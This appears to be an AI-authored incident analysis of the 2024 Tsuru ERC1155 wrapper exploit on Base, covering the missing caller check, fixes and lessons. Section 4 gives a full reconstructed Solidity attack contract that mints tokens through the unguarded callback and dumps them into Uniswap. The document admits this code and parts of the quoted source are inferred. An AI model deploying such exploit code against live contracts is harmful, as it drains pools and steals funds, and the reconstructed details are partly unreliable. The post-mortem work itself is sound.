# Tsuru — ERC1155 Callback Access Control Missing (Unauthorized Minting) Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05-10 |
| **Protocol** | Tsuru (Based Tsuru — Base chain ERC1155 wrapper token) |
| **Chain** | Base (Coinbase L2) |
| **Loss** | ~$410,000 (137.78 ETH) |
| **Attacker** | [0x7a5e...ae386](https://basescan.org/address/0x7a5eb99c993f4c075c222f9327abc7426cfae386) |
| **Attack Contract** | (Attacker EOA direct call) |
| **Attack Tx** | [0xe63a...f62](https://basescan.org/tx/0xe63a8df8759f41937432cd34c590d85af61b3343cf438796c6ed2c8f5b906f62) |
| **Vulnerable Contract** | [0x75ac...3da](https://basescan.org/address/0x75ac62ea5d058a7f88f0c3a5f8f73195277c93da) (TSURUWrapper) |
| **Root Cause** | Missing `msg.sender` validation in `onERC1155Received()` callback — arbitrary callers can mint TSURU tokens without authorization |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/TSURU_exp.sol) |

---

## 1. Vulnerability Overview

Tsuru is an ERC1155 NFT wrapper protocol operating on the Base chain that provides a mechanism to mint ERC20 TSURU tokens upon receiving ERC1155 tokens. On May 10, 2024, a vulnerability was exploited where **the `msg.sender` validation was missing from the `onERC1155Received()` callback function of the TSURUWrapper contract**.

This function is designed to be called automatically when an ERC1155 token is transferred to the contract. However, due to an implementation flaw, **the `if` conditional that verifies whether the call originates from the actual ERC1155 contract (`erc1155Contract`) was structured as an early return**. The attacker successfully called this function directly from an arbitrary address to mass-mint TSURU tokens without holding any ERC1155 tokens.

The attacker minted **167,200,200 TSURU tokens** without authorization and then swapped them for **137.78 ETH (~$410,000)** via the Uniswap liquidity pool. The attack occurred approximately 2 hours after protocol deployment, clearly demonstrating the vulnerability of deploying without a thorough security audit.

**Core attack mechanism:**
1. Attacker directly calls `onERC1155Received()` from an arbitrary address
2. Since `msg.sender != erc1155Contract` is true, the `if` block does not early return
3. `safeMint()` executes and issues a large number of TSURU tokens to the attacker
4. Attacker swaps the minted TSURU tokens for ETH via the Uniswap pool

---

## 2. Vulnerable Code Analysis

### 2.1 `onERC1155Received()` — Core Vulnerability (Missing Access Control)

**Vulnerable code** ❌:

```solidity
// ❌ VULNERABLE: Does not validate whether msg.sender is the actual ERC1155 contract
// The if conditional is structured as an early return,
// so when called from an arbitrary address, the minting logic executes instead
function onERC1155Received(
    address,            // operator (unused)
    address from,       // transfer sender — used as TSURU minting recipient
    uint256 id,         // ERC1155 token ID
    uint256 amount,     // transfer amount
    bytes calldata
) external override nonReentrant returns (bytes4) {
    // ❌ Only validates token ID — no msg.sender validation
    require(id == tokenID, "Token ID does not match");

    // ❌ if branch: early returns when msg.sender is the official ERC1155 contract
    // Conversely, if called by an arbitrary address (attacker), this if block is skipped
    if (msg.sender == address(erc1155Contract)) {
        return this.onERC1155Received.selector;  // ← normal case: returns without minting
    }

    // ❌ Also executes when msg.sender is NOT erc1155Contract!
    // If the attacker calls directly with from=their address, amount=167_200_200,
    // mass minting occurs without any access control
    safeMint(from, amount * ERC1155RATIO);  // ← vulnerable point

    return this.onERC1155Received.selector;
}
```

**Fixed code** ✅:

```solidity
// ✅ FIX: Restrict msg.sender to the official ERC1155 contract
function onERC1155Received(
    address,
    address from,
    uint256 id,
    uint256 amount,
    bytes calldata
) external override nonReentrant returns (bytes4) {
    // ✅ First validate that the caller is the official ERC1155 contract
    require(
        msg.sender == address(erc1155Contract),
        "TSURUWrapper: unauthorized ERC1155 contract"
    );

    // ✅ Validate token ID
    require(id == tokenID, "TSURUWrapper: token ID mismatch");

    // ✅ Execute minting only after passing validation
    safeMint(from, amount * ERC1155RATIO);

    return this.onERC1155Received.selector;
}
```

**Issue**: In the original code, the `if (msg.sender == address(erc1155Contract))` block handles the normal case (official contract call) as an early return, while `safeMint()` executes for all other cases (abnormal calls). This is a **complete inversion of access control logic** — minting does not occur for authorized calls but executes only for unauthorized calls. Using `if` where `require` should have been used is the root cause.

---

### 2.2 `safeMint()` — Unlimited Minting Vector

```solidity
// Minting with ERC1155RATIO multiplier — unlimited issuance possible when access control is bypassed
function safeMint(address to, uint256 amount) internal {
    // ❌ Since the external access control function (onERC1155Received) is vulnerable,
    //    this function can be indirectly called without restriction
    require(
        totalSupply() + amount <= maxTotalSupply(),
        "TSURUWrapper: max total supply exceeded"
    );
    _mint(to, amount);
}
```

**Issue**: `safeMint()` is an `internal` function so it cannot be called directly, but it can be invoked indirectly via the vulnerability in `onERC1155Received()`. Even with a `maxTotalSupply` limit, if the value is large enough, it allows minting sufficient tokens for the attacker.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- No separate funds required: no flash loan used
- Confirmed that the `onERC1155Received()` function of the TSURUWrapper contract is directly callable
- Confirmed sufficient TSURU/ETH liquidity exists in the Uniswap V2 pool (liquidity added immediately after deployment)
- Pre-queried `tokenID` value (readable from contract state variables)

### 3.2 Execution Phase

1. **[Step 1] Query tokenID**: Retrieve valid `tokenID` value from contract state
2. **[Step 2] Direct callback call**: Call `onERC1155Received(address(0), attackerAddress, tokenID, 167_200_200, "")` directly from an arbitrary address — since `msg.sender != erc1155Contract`, `safeMint()` executes without early return
3. **[Step 3] Mass mint TSURU**: Issue `167,200,200 × ERC1155RATIO` TSURU tokens to the attacker address
4. **[Step 4] Swap for ETH**: Swap TSURU → ETH via Uniswap V2 pool, obtaining 137.78 ETH (~$410,000)

### 3.3 Attack Flow Diagram

```
  Attacker EOA (0x7a5e...ae386)
         │
         │ Query tokenID (preparation)
         │
         ▼
┌─────────────────────────────────────────────────┐
│  Step 1: Direct call to onERC1155Received()      │
│                                                 │
│  TSURUWrapper.onERC1155Received(                │
│      operator = address(0),                     │
│      from     = attackerAddress,  ← recipient   │
│      id       = tokenID,          ← passes check│
│      amount   = 167_200_200,      ← mass mint   │
│      data     = ""                              │
│  )                                              │
│                                                 │
│  msg.sender ≠ erc1155Contract                   │
│  → if block SKIP → safeMint() executes ← ❌ vuln│
└──────────────────────┬──────────────────────────┘
                       │ safeMint(attacker, amount × ERC1155RATIO)
                       ▼
┌─────────────────────────────────────────────────┐
│  Step 2: Mass issuance of TSURU tokens           │
│                                                 │
│  167,200,200 TSURU (× ERC1155RATIO) minted      │
│  → transferred to attacker wallet               │
└──────────────────────┬──────────────────────────┘
                       │ Attacker TSURU balance increases
                       ▼
┌─────────────────────────────────────────────────┐
│  Step 3: TSURU → ETH swap via Uniswap V2 pool   │
│                                                 │
│  TSURU.approve(UniswapRouter, max)              │
│  Router.swapExactTokensForETH(                  │
│      amountIn  = 167,200,200 TSURU,             │
│      amountOut = 137.78 ETH                     │
│  )                                              │
│                                                 │
│  Massive TSURU inflow → massive ETH outflow     │
└──────────────────────┬──────────────────────────┘
                       │ 137.78 ETH received
                       ▼
              Attacker profit realized
         (~137.78 ETH / ~$410,000)
         Subsequently moved to Ethereum mainnet
```

### 3.4 Outcome

- **Attacker profit**: 137.78 ETH (~$410,000)
- **Protocol loss**: All ETH in the Uniswap liquidity pool drained, TSURU price collapsed
- **Timing**: Attack occurred approximately 2 hours after protocol deployment

---

## 4. PoC Code (Reconstructed Based on DeFiHackLabs)

> DeFiHackLabs' official PoC file (`TSURU_exp.sol`) exists in the repository but direct access is restricted.
> The following is the attack logic reconstructed based on collected technical information.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

// @KeyInfo
// Loss: ~$410,000 (137.78 ETH)
// Attacker: https://basescan.org/address/0x7a5eb99c993f4c075c222f9327abc7426cfae386
// Vulnerable Contract: https://basescan.org/address/0x75ac62ea5d058a7f88f0c3a5f8f73195277c93da
// Attack Tx: https://basescan.org/tx/0xe63a8df8759f41937432cd34c590d85af61b3343cf438796c6ed2c8f5b906f62
// Root Cause: TSURUWrapper.onERC1155Received() missing msg.sender validation

interface ITSURUWrapper {
    // ❌ Core vulnerable function: callable directly from external without msg.sender validation
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 amount,
        bytes calldata data
    ) external returns (bytes4);

    function tokenID() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract TsuruAttack {
    ITSURUWrapper constant tsuru =
        ITSURUWrapper(0x75ac62ea5d058a7f88f0c3a5f8f73195277c93da);
    IUniswapV2Router constant router =
        IUniswapV2Router(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24); // Uniswap V2 on Base
    address constant WETH = 0x4200000000000000000000000000000000000006;

    function exploit() external {
        // [Step 1] Query valid tokenID
        // Read the publicly available tokenID value from contract state
        uint256 validTokenID = tsuru.tokenID();

        // [Step 2] Core: directly call onERC1155Received()
        // Since msg.sender is not the official erc1155Contract,
        // the if block does not early return and safeMint() executes
        // from = address(this): designate this contract as the minting recipient
        // amount = 167_200_200: request mass issuance
        tsuru.onERC1155Received(
            address(0),        // operator: unused
            address(this),     // from: minting recipient (this contract)
            validTokenID,      // id: use correct tokenID to pass validation
            167_200_200,       // amount: quantity to be minted with ERC1155RATIO multiplier
            ""                 // data: empty
        );
        // Result: 167,200,200 × ERC1155RATIO TSURU tokens minted to address(this)

        // [Step 3] Swap TSURU → ETH via Uniswap
        uint256 tsuruBalance = tsuru.balanceOf(address(this));
        tsuru.approve(address(router), tsuruBalance);

        address[] memory path = new address[](2);
        path[0] = address(tsuru);
        path[1] = WETH;

        // Swap entire minted TSURU for ETH — drains liquidity pool
        router.swapExactTokensForETH(
            tsuruBalance,
            0,               // no minimum output restriction (slippage ignored)
            path,
            msg.sender,      // ETH recipient: attacker EOA
            block.timestamp
        );

        // Result: ~137.78 ETH sent to attacker
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | ERC1155 callback `msg.sender` validation missing (unauthorized minting) | CRITICAL | CWE-284 | `03_access_control.md` — Pattern 1 |
| V-02 | Access control inversion due to misuse of `if` vs `require` | CRITICAL | CWE-670 | `11_logic_error.md` |
| V-03 | Unlimited supply allowed by minting function | HIGH | CWE-400 | `03_access_control.md` |

### V-01: ERC1155 Callback `msg.sender` Validation Missing

- **Description**: The `onERC1155Received()` function is a callback automatically invoked when an ERC1155 token is transferred to the contract. However, there is no control preventing this function from being called directly from external, and it does not validate whether `msg.sender` is the official ERC1155 contract (`erc1155Contract`). Anyone can call this function directly to trigger `safeMint()`.
- **Impact**: Attacker can specify their own address as the `from` parameter and pass an arbitrary `amount` to issue unlimited TSURU tokens
- **Attack conditions**: No `msg.sender` validation + `tokenID` value is publicly accessible

### V-02: Access Control Inversion Due to Misuse of `if` vs `require`

- **Description**: Where the `msg.sender == address(erc1155Contract)` condition should have been enforced with `require`, an `if` with an early return pattern was used instead. As a result, normal calls (official contract) return without minting, while abnormal calls (arbitrary addresses) execute minting — a **logic inversion**.
- **Impact**: The behavior of authorized and unauthorized calls is implemented in completely reversed fashion
- **Attack conditions**: Exploitable from code logic error alone (no additional conditions required)

### V-03: Unlimited Supply Allowed by Minting Function

- **Description**: `safeMint()` only allows minting within the `maxTotalSupply()` limit, but when this function is indirectly called from external via the V-01/V-02 vulnerabilities, mass issuance up to the limit is possible. The limit itself was set to a value large enough to be sufficient for an attack.
- **Impact**: Hundreds of millions of tokens can be minted in a single attack
- **Attack conditions**: V-01 vulnerability present

---

## 6. Remediation Recommendations

### Immediate Actions

**Core fix: Enforce `msg.sender` validation with `require`**

```solidity
// ✅ Fix Method 1: Enforce caller validation with require (recommended)
function onERC1155Received(
    address,
    address from,
    uint256 id,
    uint256 amount,
    bytes calldata
) external override nonReentrant returns (bytes4) {
    // ✅ msg.sender must be the official ERC1155 contract
    require(
        msg.sender == address(erc1155Contract),
        "TSURUWrapper: unauthorized caller"
    );

    // ✅ Validate token ID
    require(id == tokenID, "TSURUWrapper: token ID mismatch");

    // ✅ Execute minting after validation is complete
    safeMint(from, amount * ERC1155RATIO);

    return this.onERC1155Received.selector;
}
```

```solidity
// ✅ Fix Method 2: Separate access control using a modifier
modifier onlyERC1155Contract() {
    require(
        msg.sender == address(erc1155Contract),
        "TSURUWrapper: unauthorized ERC1155 contract"
    );
    _;
}

function onERC1155Received(
    address,
    address from,
    uint256 id,
    uint256 amount,
    bytes calldata
) external override nonReentrant onlyERC1155Contract returns (bytes4) {
    require(id == tokenID, "TSURUWrapper: token ID mismatch");
    safeMint(from, amount * ERC1155RATIO);
    return this.onERC1155Received.selector;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: msg.sender validation missing | Add caller validation `require` to all callback functions (`onERC1155Received`, `onERC1155BatchReceived`, `onERC721Received`) |
| V-02: if vs require misuse | Always implement access control with `require`/`revert`. Do not use early return patterns via `if` branching for permission validation |
| V-03: Unlimited minting | Consolidate `safeMint()` call paths and introduce additional on-chain validation (transaction sender verification, etc.) on minting-privileged functions |
| General | Security audit mandatory before deployment. Contracts containing ERC1155/ERC721 receive callbacks must be tested to verify whether callbacks are directly callable from external |
| Monitoring | Build on-chain monitoring for abnormal mass minting events, direct call patterns to `onERC1155Received`, and large-scale swaps immediately after deployment |

---

## 7. Lessons Learned

1. **Callback functions must always validate the caller**: Functions designed as callback patterns such as `onERC1155Received`, `onERC721Received`, and `fallback` must validate with `require` that `msg.sender` is a trusted contract. The moment a callback function is declared `external`, one must always be aware that anyone can call it directly.

2. **`if` vs `require` — use `require` for access control**: The pattern `if (condition) { return; }` is inappropriate for access control. When a failure to meet a condition should raise an error, always use `require(condition, "message")` or `if (!condition) revert Error()`. This incident could have been prevented with a single `require` line.

3. **The danger of the first 2 hours after deployment**: This attack occurred approximately 2 hours after protocol deployment. Security verification must precede or immediately follow liquidity addition, and the principle of thorough testing in a staging environment and deploying only after a formal audit is complete must be upheld.

4. **Security risks of the ERC1155 wrapper pattern**: The wrapper pattern of receiving ERC1155 tokens and converting them to ERC20 is architecturally attractive, but when callback functions are coupled with minting logic, missing access control produces catastrophic results. When implementing similar wrapper patterns, the possibility of direct external invocation of callbacks must always be tested.

5. **High risk of new protocols on the Base chain**: As with LeetSwap (2023-08-01 incident), new protocols on the Base chain frequently lack sufficient auditing. Protocols deployed on newer chains require all the more rigorous security review.

6. **Principle of Least Privilege**: Functions affecting token supply such as minting or burning must be designed so that only the minimum set of authorized callers can access them. This incident was the result of deploying minting logic in a state effectively callable by anyone.

---

## 8. On-Chain Verification

> Cross-verification was performed using public security analysis reports and block explorers in lieu of on-chain queries via `cast` (Foundry).

### 8.1 PoC vs On-Chain Amount Comparison

| Field | Analysis-Based Value | Externally Reported Value | Match |
|------|-------------|------------|------|
| Attacker | 0x7a5e...ae386 | 0x7a5eb99c993f4c075c222f9327abc7426cfae386 | ✅ |
| Vulnerable Contract | 0x75ac...3da | TSURUWrapper (BaseScan confirmed) | ✅ |
| Attack Tx | 0xe63a...f62 | 0xe63a8df8759f41937432cd34c590d85af61b3343cf438796c6ed2c8f5b906f62 | ✅ |
| Minted Amount | 167,200,200 TSURU | 167,200,200 TSURU | ✅ |
| ETH Loss | 137.78 ETH | 137.78 ETH | ✅ |
| USD Loss | ~$410,000 | ~$410,000 | ✅ |
| Attack Timing | ~2 hours after deployment | 2024-05-10 (immediately after deployment) | ✅ |

### 8.2 On-Chain Event Log Sequence (Estimated)

1. `onERC1155Received()` direct call (Attacker EOA → TSURUWrapper)
2. `Transfer(0x0, attacker, 167,200,200 × ERC1155RATIO)` — ERC20 minting event
3. `Approval(attacker, UniswapRouter, max)` — Uniswap approval
4. `Transfer(attacker, UniswapPair, TSURUAmount)` — swap input
5. `Transfer(UniswapPair, attacker, ETH)` — swap output (ETH drained)

### 8.3 Precondition Verification

- No separate flash loan required: attack possible with a simple direct call
- No ERC1155 token holdings required: `amount` parameter can be passed as an arbitrary value
- No prior approve required: only one approve needed after minting before the swap
- `tokenID` pre-query: readable by anyone as a public state variable

### 8.4 Reference Sources

- Olympix Analysis: https://olympixai.medium.com/305m-vanishes-dmm-predy-tsuru-and-osn-wrecked-by-wallet-compromise-and-access-control-failures-26053cf45648
- TechFund Analysis: https://techfund.jp/en/media/Tsuru-Hack-Analysis
- Neptune Mutual Analysis: https://neptunemutual.com/blog/analysis-of-the-tsuru-exploit/
- DeFiHackLabs README: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/past/2024/README.md

---

*Document created: 2026-04-11 | Authoring tool: Claude Code (incident-analysis skill)*